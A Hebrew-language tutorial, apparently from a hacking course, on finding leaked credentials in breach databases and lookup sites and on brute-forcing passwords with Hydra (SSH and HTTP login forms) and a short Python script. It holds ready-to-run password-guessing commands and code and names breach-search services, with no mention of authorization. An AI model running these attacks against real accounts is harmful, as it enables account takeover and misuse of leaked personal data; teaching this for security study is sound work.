
## מה הם Breaches?

אירועי Breach הוא אירוע שבו מאגרי מידע המכילים פרטי משתמשים דולפים לרשת, לרוב עקב פרצות אבטחה. פרטים אלו כוללים שמות משתמשים, סיסמאות, מיילים, מספרי אשראי ועוד.

### דוגמאות ל-Breaches מפורסמים:

- **Yahoo (2013, 2014)** - דליפת מידע של כ-3 מיליארד חשבונות.
- **LinkedIn (2012, 2021)** - פרטי מיליוני משתמשים דלפו.
- **Facebook (2019, 2021)** - מאגרי מידע ענקיים עם מספרי טלפון וכתובות דוא"ל של מאות מיליוני משתמשים.

## מציאת חשבונות וסיסמאות מודלפים באמצעות מאגרי Breaches

כאשר Breach מתרחש, הנתונים לרוב מופיעים במאגרים ציבוריים או נמכרים בפורומים שונים. ניתן להשתמש בכלים ובאתרים כדי לבדוק אם מייל או סיסמה נמצאים במאגרים אלו.

### חיפוש ב-Breaches עם אתרים ייעודיים:

- **[https://haveibeenpwned.com](https://haveibeenpwned.com)** – מאפשר חיפוש כתובות מייל ולראות אם נפרצו.
- **[https://dehashed.com](https://dehashed.com)** – מנוע חיפוש לסיסמאות ומיילים שהודלפו (דורש רישום ולעיתים תשלום).
- **[https://snusbase.com](https://snusbase.com)** – עוד אתר למציאת פרטי חשבונות מודלפים.

### חיפוש מקומי בקובצי Breach

אם יש קובץ דליפה, ניתן לחפש בתוכו כתובת מייל מסוימת עם הפקודה:

```sh
grep "user@example.com" breaches.txt
```

או לחפש לפי סיסמה מסוימת:

```sh
grep "password123" breaches.txt
```

אחד הקבצי סיסמאות מוכרות המוכר ביותר הוא "rockyou". תוכלו להתקין אותו כך:
```
git clone https://github.com/IrishMaestro/rockyou
cd rockyou
gzip -d rockyou.txt.gz
```

## מה זה Brute Force?

הטכניקה Brute Force הוא סוג של מתקפה המשמשת לניחוש סיסמאות על ידי ניסוי כל האפשרויות האפשריות. מתקפה זו מתבצעת באופן אוטומטי בעזרת סקריפטים או כלים ייעודיים.
המתקפה יעילה אם יש לכם רשימה של סיסמאות שקיבלתם מbreach או רשימה מוכרת כמו rockyou.
## שימוש בכלי Hydra לביצוע Brute Force

הכלי Hydra הוא כלי פופולרי לביצוע מתקפות Brute Force על מגוון שירותים כמו SSH, FTP, HTTP, RDP ועוד.

### התקנת Hydra (אם אינו מותקן):

```sh
sudo apt update
sudo apt install hydra
```

### דוגמה להרצת hydra על שירות SSH:

```sh
hydra -l root -P passwords.txt amittech.dev ssh
```

**הסבר הפרמטרים:**

- `-l admin` - ניסיון כניסה עם שם משתמש קבוע.
- `-P passwords.txt` - קובץ המכיל רשימת סיסמאות לניסוי. 
- הפרוטוקול `ssh` - פה בחרנו בפורטוקול SSH שאנחנו עושים לו את המתקפה.

שימו לב לבחור קובץ סיסמאות חזק, אחד הwordlist-י סיסמאות הכי פופלרים הם rockyou.txt (שדיברנו עליהם קודם)

למעשה בhydra יש עוד המון אפשרויות לbruteforce-ים, קראו בעצמכם.

## דוגמה להרצת hydra עם HTTP
כמובן שנוכל להשתמש בhydra גם בhttp, אך לפני זה- נצטרך לחקור קצת את האתר ולהבין למשל איך עושים login.
כלומר, האם זו בקשת post? לאיזה נתיב? איזה פרמטרים צריך להעביר?
לאחר שעניתם על השאלות תוכלו להריץ את הפקודה:
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt -f -V example.com http-post-form "/login.php:user=^USER^&password=^PASS^:Invalid Login"
```

## כתיבת סקריפט Python לביצוע Brute Force

במקום להשתמש ב-Hydra, ניתן לכתוב סקריפט Python המבצע Brute Force אם אנחנו רוצים לעשות bruteforce בצורה ספציפית.
הנה דוגמה לסקריפט שעושה ברוט-פורס על אתר עם טופס כניסה.

```python
import requests

url = "http://target-site.com/login"
user = "admin"
passwords = open("passwords.txt").read().splitlines()

for password in passwords:
    data = {"username": user, "password": password}
    response = requests.post(url, data=data)
    if "Incorrect password" not in response.text:
        print(f"[+] Password found: {password}")
        break
```
